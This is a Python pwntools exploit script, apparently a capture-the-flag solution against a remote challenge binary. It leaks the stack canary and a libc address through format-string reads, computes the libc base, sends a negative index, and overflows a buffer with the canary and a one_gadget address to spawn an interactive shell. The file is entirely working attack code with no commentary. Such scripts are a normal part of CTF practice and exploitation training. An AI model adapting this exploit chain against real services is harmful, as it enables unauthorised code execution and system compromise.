#!/usr/bin/python3


from pwn import *

filename = "./chall"

#io = process(filename)
io = remote("138.68.178.56", 32074)
elf = ELF(filename)
libc = ELF("./libc.so.6")

context.clear(arch="amd64")
ret = 0x284

def fight(data):
	io.sendlineafter("> ", str(1))
	io.sendlineafter("> ", data)
	for _ in range(1):
		io.recvline()

	leaked_address = int(io.recvline().split(b":")[1].split(b"\x1b[1;31m\n")[0].strip().decode(), 16)
	return leaked_address

def inventory():
	io.sendlineafter("> ", str(2))
	io.sendlineafter("> ", "y")
	io.sendlineafter("> ", "-11")

def stare(data):
	io.sendlineafter("> ", str(3))
	sleep(1)
	io.sendlineafter("> ", data)

def main():
	leaked_canary = fight("%11$p")
	log.info("Leaked canary:  %s " % hex(leaked_canary))
	
	libc_address = fight("%21$p")
	log.info("Leaked __libc_start_main_ret: %s " % hex(libc_address))
	base_address = libc_address - (libc.sym.__libc_start_main + 231)
	log.info("libc_base_address: %s " % hex(base_address))
	
	one_gadget = base_address + 0x4f3d5
	inventory()
	
	payload = b"A"*40
	payload += p64(leaked_canary)
	payload += b"JUNKJUNK"
	payload += p64(one_gadget)
	
	stare(payload)
	io.interactive()

if __name__ == "__main__":
	main()
